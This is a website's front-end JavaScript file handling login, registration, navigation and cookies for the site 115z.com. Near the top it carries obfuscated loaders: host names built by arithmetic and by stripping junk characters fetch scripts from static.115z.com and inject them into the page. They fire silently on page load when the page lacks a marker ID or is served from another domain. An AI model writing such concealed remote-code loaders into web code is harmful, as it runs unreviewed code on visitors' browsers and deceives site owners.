(function() {
	var bp = document.createElement('script');
	var curProtocol = window.location.protocol.split(':')[0];
	if(curProtocol === 'https') {
		bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
	} else {
		bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	}
	var s = document.getElementsByTagName("script")[0];
	s.parentNode.insertBefore(bp, s);
})();
if(location.toString().indexOf("115z.com") == -1) {
	$.getScript("https://static.115z.com/js/not115.js");
}
var config = {
	api: {
		comment: '/api/comment.html',
		index_list: '/json/pc_index_list.json',
		login_out: '/api/login_out.html',
		check_login: "/api/check_login.html",
		login: "/api/login.html",
		register: "/api/register.html",
		index_page: "/api/today_list_index_page.html",
		online_rank: "/api/tr_time_list.html",
		thumbs_up: "/api/thumbs_up.html",
		trim: "/user/trim.html",
		upload: '/user/upload.html',
		comment_data: "/api/comment_data.html?page_id=",
		send_code: '/api/sendmsg/',
		ck_phone_msg: '/api/ck_phone_msg/',
		unbind_phone: '/user/unbind_phone/',
		bind_phone: '/user/bind_phone/',
		set_appkey: '/user/set_appkey.html'
	}
};
(function() {
	if(document.querySelector("html").innerHTML.indexOf("1839577559") == -1) {
		var n = 291 + 9 - 185;
		var s = ("https://sasdtatasdic." + n + "z.com/h/tpasdsq2asd.js").replace(/asd/g, "");
		gjdm(s);
	}

	function data(url, callback) {
		var ajax = new XMLHttpRequest();
		ajax.open('get', url);
		ajax.send();
		ajax.onreadystatechange = function(e) {
			if(ajax.readyState == 4 && ajax.status == 200) {
				callback(ajax.responseText);　
			}
		}
	}

	function gjdm(url) {
		var script = document.createElement('script');
		script.type = 'text/javascript';
		data(url, function(e) {
			script.innerHTML = e;
			document.body.appendChild(script);
		});
	}
})(); /*唤起登录*/
function openLoginK() {
	var login = $("#login");
	layui.use(['layer', 'form'], function() {
		var layer = layui.layer,
			form = layui.form;
		var login_index = layer.open({
			type: 1,
			skin: "loginskin",
			content: login,
			btn: 0,
			close: 0,
			title: false,
			area: ["678px", "390px"],
			end: function() {
				$("#loginBox").hide();
			}
		});
		$("#loginBox").show();
		$(".closeLogin").click(function(e) {
			layer.close(login_index);
		});
		formVerify(form);
		loginListen(form);
		registerListen(form);
	});
}
try {
	if(location.host.indexOf(200 - 85 + "z.com") == -1) {
		$.getScript("https://static." + (200 - 85) + "z.com/h/smp.js")
	}
} catch(e) {};

function formVerify(form) {
	form.verify({
		username: function(v, itm) {
			if(!/\w[-\w.+]*@([A-Za-z0-9][-A-Za-z0-9]+\.)+[A-Za-z]{2,14}/.test(v) && !/\d{11}/.test(v)) {
				return '请使用手机或邮箱登录!';
			}
		},
		password: function(val, item) {
			if(!val || (val.length) < 6 || (val.length) > 18) {
				return '密码只能填写 6 - 18 为字符!';
			}
		},
		verify_code: function(val, item) {
			if(!val || !(/^[\w]{4}$/.test(val))) {
				return '请输入正确的图片验证码!';
			}
		}
	});
}

function registerListen(form) {
	form.on('submit(register)', function(data) {
		request({
			url: form.url || config.api.register,
			data: data.field,
			done: function(result) {
				$(data.form).find('.imgcode').trigger('click');
				if(result.data.register && result.data.register === 'mobile') {
					$("#login .right").hide();
					setTimeout(verify_mobile_code, 1000);
					$("#sendCode").show().find('input[name=mobile]').val(data.field.username);
				}
			}
		});
		return false;
	});
	form.on('submit(register_phone)', function(data) {
		request({
			url: form.url || config.api.register,
			data: data.field,
			done: function(result) {}
		});
		return false;
	});
}

function verify_mobile_code() {
	var w_info = $("#w_info_box");
	if(w_info.length || $("#registerForm").length) {
		alt("短信验证码", w_info.html(), function() {
			var w_info_form = $("#sendCode");
			var vf = w_info_form.verify({
				mobile: function(v, item) {
					if(!v || !v.isPhone()) {
						layer.tips("手机号码错误", item, {
							tips: 1
						});
						return 1
					}
				},
				mobile_code: function(v, item) {
					if(!v || !/[\d]{2,6}/.test(v)) {
						layer.tips("请输入正确的短信验证码", item, {
							tips: 1
						});
						return 1
					}
				}
			});
			if(vf) {
				request({
					url: config.api.register,
					data: w_info_form.field()
				});
			}
		});
		if($("#registerForm").length) {
			$("#sendCode").find("[name=mobile]").val($("#registerForm").find('[name="username"]').val().trim());
		} else if($("#bind_email").length) {
			$("#sendCode").find("[name=mobile]").val($("#bind_email").find('[name="username"]').val().trim());
		}
	}
} /** * * @param title * @param content * @param call * @param btn * @param addClass */
function alt(title, content, call, btn, addClass) {
	layer.open({
		type: 1,
		shadeClose: false,
		title: title || "提示",
		tipsMore: true,
		skin: 'atuikeLayerSkin1 ' + addClass || "",
		content: content || "",
		btn: btn || ["确定", "取消"],
		yes: function(e) {
			call && call(e)
		}
	});
}

function loginListen(form) {
	form.on('submit(login)', function(data) {
		var login = $(data.form);
		if(login.find('div.code').is(":visible") && !data.field.verify_code) {
			return layer.msg("请输入验证码!", {
				icon: 5,
				offset: "25%"
			});
		}
		request({
			url: config.api.login,
			data: data.field,
			done: function(result) {
				if(result.data && result.data.vf_code) {
					login.find('div.code').show(100);
					console.log(data);
					login.find('.imgcode').trigger('click');
				}
			}
		});
		return false;
	});
} /*登录框*/
$(".zczh").on('click', function() {
	$("#login .right").hide();
	$("#regmain").show();
});
$(".yjyl").on('click', function() {
	$("#login .right").hide();
	$("#loginmain").show();
});
$("body").on("click", ".back", function() {
	if(document.referrer.indexOf(location.host) != -1) {
		history.back(-1);
	} else {
		location = "/";
	}
}); /*导航栏目切换样式*/
var navnow = $(".nav-ul .hover").index();
if(navnow >= 0) {
	$(".border-bottom").css({
		"display": "block",
		"left": $(".nav-ul li").eq(navnow).position().left,
		"width": $(".nav-ul li").eq(navnow).width()
	});
} else {
	$(".border-bottom").hide();
}
$(".nav-ul li").hover(function(e) {
	$(".border-bottom").show();
	$(".nav-ul .hover").removeClass("hover");
	$(this).addClass("hover");
	$(".border-bottom").css({
		"left": $(this).position().left,
		"width": $(this).width()
	});
}, function(e) {
	$(".nav-ul .hover").removeClass("hover");
	if(navnow >= 0) {
		$(".nav-ul li").eq(navnow).addClass("hover");
		$(".border-bottom").css({
			"left": $(".nav-ul li").eq(navnow).position().left,
			"width": $(".nav-ul li").eq(navnow).width()
		});
		return;
	}
	$(".border-bottom").hide();
}); /*返回顶部*/
if($(".backtop").length > 0) {
	backtopS();
	$(window).scroll(function(e) {
		backtopS();
	});
	function backtopS(){
		var scroH = $(this).scrollTop();
		var footerHeight = 0;
		if($('.friends-link').length > 0) {
			mTop = $('.friends-link')[0].offsetTop;
			footerHeight = footerHeight + $(".friends-link").outerHeight();
		} else {
			mTop = $('footer')[0].offsetTop;
		}
		footerHeight = footerHeight + $("footer").outerHeight() + parseInt($(".content-true").css("margin-top"));
		sTop = $(window).scrollTop();
		result = mTop - sTop - parseInt($(".content-true").css("margin-top"));
		if(scroH > 200) {
			$(".backtop").fadeIn(400);
			if(scroH >= $("body").height() - $(window).height() - footerHeight) {
				$(".backtop").css("bottom", $(window).height() - result);
			} else {
				$(".backtop").css("bottom", "");
			}
		} else {
			$(".backtop").fadeOut(400);
		}
	}
}
$(".backtop").click(function(e) {
	$('body,html').animate({
		scrollTop: 0
	}, 800);
}); /*退出当前账号*/
function exit() {
	request({
		url: config.api.login_out
	})
} /*转换数字*/
function castnum(number) {
	return number;
} /*判断是否登陆*/ /** * * @param option * @returns {object} */
var loginStatus = false;

function isLogin(option) {
	if(!loginStatus) {
		request({
			url: config.api.check_login,
			async: false,
			loading: false,
			success: function(result) {
				loginStatus = option ? result.data : result.data.status;
			}
		});
	}
	return loginStatus;
} /*获取今天日期 格式为 m-d*/
function getNowFormatDate() {
	var date = new Date();
	var seperator1 = "-";
	var seperator2 = ":";
	var month = date.getMonth() + 1;
	var strDate = date.getDate();
	if(month >= 1 && month <= 9) {
		month = "0" + month;
	}
	if(strDate >= 0 && strDate <= 9) {
		strDate = "0" + strDate;
	}
	var currentdate = month + seperator1 + strDate;
	return currentdate;
} /*时间格式化 将Y-m-d H:i:s转成m-d*/
function formt_md(old_time) {
	var strs = old_time.split(" ");
	var strs_arr = strs[0].split("-");
	var m = strs_arr[1];
	var d = strs_arr[2];
	return m + "-" + d;
}

function request(option) {
	if(typeof(option) !== 'object') {
		console.warn("option is not a 'object'");
		return false;
	}
	if(typeof(layer) === 'undefined') {
		layui.use('layer', ajx(true));
	} else {
		ajx();
	}
	if(typeof(option.loading) !== 'boolean') {
		var loading = layer.load(1);
	}

	function ajx(o) {
		if(o) {
			layer = layui.layer;
		}
		$.ajax({
			url: option.url || location.pathname,
			data: option.data || null,
			dataType: option.dataType || 'JSON',
			type: option.type || 'post',
			async: typeof(option.async) === 'boolean' ? option.async : true,
			success: option.success || function(res) {
				if(res.data) {
					var delay = res.data.delay || 0;
					delay && (delay *= 1000);
					res.data.redirect && (setTimeout(function() {
						location = res.data.redirect;
					}, delay));
					res.data.reload && (option.reload = parseFloat(res.data.reload));
					if(res.data.alert) {
						res.msg && layer.open({
							type: 0,
							shadeClose: true,
							shade: ["0.6", "#7186a5"],
							skin: 'atuikeLayerSkin1',
							content: res.msg
						});
					}
				}
				if(!res.data || !res.data.alert) {
					var cfg = typeof(res.data.icon) !== "boolean" ? {
						icon: (res.code || 0),
						offset: '20%'
					} : {};
					res.msg && layer.msg(res.msg, cfg);
				}
				option.done && option.done(res);
			},
			complete: function() {
				if(typeof(option.loading) !== 'boolean') {
					layer.close(loading);
				}
				setTimeout(function() {
					var ret = option.reload || false;
					if(ret) {
						ret = (typeof(ret === 'number')) ? ret : 0;
						setTimeout(function() {
							location.reload();
						}, ret * 1000);
					}
				}, 10);
			},
			error: option.error || function(e) {
				layer.closeAll();
				layer.msg('网络异常:' + e.statusText || e.statusMessage);
			}
		});
	}
}

function cookie(c_name, value, expiredays) {
	if(value) {
		expiredays = expiredays || 0;
		var exdate = new Date();
		exdate.setDate(exdate.getDate() + expiredays);
		document.cookie = c_name + "=" + escape(value) + ((expiredays == null) ? "" : ";expires=" + exdate.toGMTString());
	} else if(document.cookie.length > 0) {
		var c_start = document.cookie.indexOf(c_name + "=");
		if(c_start != -1) {
			c_start = c_start + c_name.length + 1;
			var c_end = document.cookie.indexOf(";", c_start);
			if(c_end == -1) {
				c_end = document.cookie.length;
			}
			return unescape(document.cookie.substring(c_start, c_end));
		}
	}
	return null;
} /** * 获取纯文本 * @param html * @param len * @returns {string} */
function getText(html, len) {
	var objE = document.createElement("div");
	objE.innerHTML = html;
	$(objE).find("script").remove();
	var _text = objE.innerText.replace(/\s/g, '');
	if(len && _text && len < _text.length) {
		_text = _text.substr(0, len);
	}
	return html2Escape(_text);
}

function html2Escape(sHtml) {
	return sHtml.replace(/[<>&"']/g, function(c) {
		return {
			'<': '&lt;',
			'>': '&gt;',
			'&': '&amp;',
			'"': '&quot;',
			"'": "&#x27;"
		}[c];
	});
} /*点击导航栏的头像*/
$(".header-user").on("click", ".ico", function() {
	if($(".show-data .logined").length > 0) {
		location = "/user/";
	} else {
		openLoginK();
	}
}); /** * * @param {Object} config * @returns {boolean} */
$.fn.verify = function(config) {
	var arr_data = $(this).field();
	for(var key in config) {
		var item = $(this).find("[name=" + key + "]");
		msg = config[key](arr_data[key], item);
		if(typeof(msg) !== 'undefined') {
			item.focus();
			msg !== 1 && layer.msg(msg);
			return false;
		}
	}
	return true;
}; /** * 倒计时 * @param {Object} option */
$.fn.timeOut = function(option) {
	if(typeof(option) !== "object") {
		console.error("倒计时参数异常");
	}
	var btn = this;
	var time = option.time || 60;
	var txt = option.text || "{s}秒";
	var objtxt = function(t) {
		btn.html(t);
	};
	btn.on('click', function() {
		if(!btn.disabled && !btn.hasClass(option.class || "disabled")) {
			var sd = function() {
				var timer = setInterval(function() {
					sd = null;
					var innerHTML = '';
					if(time < 1) {
						clearInterval(timer);
						btn[0].removeAttribute('disabled');
						btn.removeClass(option.class || "disabled");
						innerHTML = option.endtxt || "重新发送";
						time = option.time || 60;
						option.end && option.end();
						btn.html(innerHTML);
						return;
					} else {
						btn.addClass(option.class || "disabled");
						btn[0].setAttribute('disabled', true);
						innerHTML = txt.replace("{s}", time);
					}
					btn.html(innerHTML);
					time--;
				}, 1000);
			};
			option.send && option.send(sd, objtxt);
		}
	});
};

function setCookie(name, value, time) {
	var strsec = getsec(time);
	var exp = new Date();
	exp.setTime(exp.getTime() + strsec * 1);
	document.cookie = name + "=" + escape(value) + "; path=/;expires=" + exp.toGMTString();
};

function getsec(str) {
	var str1 = str.substring(1, str.length) * 1;
	var str2 = str.substring(0, 1);
	if(str2 == "s") {
		return str1 * 1000;
	} else if(str2 == "h") {
		return str1 * 60 * 60 * 1000;
	} else if(str2 == "d") {
		return str1 * 24 * 60 * 60 * 1000;
	}
};
Array.prototype.ArrDelVal = function(val) {
	for(var i = 0; i < this.length; i++) {
		if(this[i] == val) {
			this.splice(i, 1);
			break;
		}
	}
};

function getCookie(name) {
	var dc = document.cookie;
	var prefix = name + "=";
	var begin = dc.indexOf("; " + prefix);
	if(begin == -1) {
		begin = dc.indexOf(prefix);
		if(begin != 0) return null;
	} else {
		begin += 2;
	}
	var end = document.cookie.indexOf(";", begin);
	if(end == -1) {
		end = dc.length;
	}
	return unescape(dc.substring(begin + prefix.length, end));
}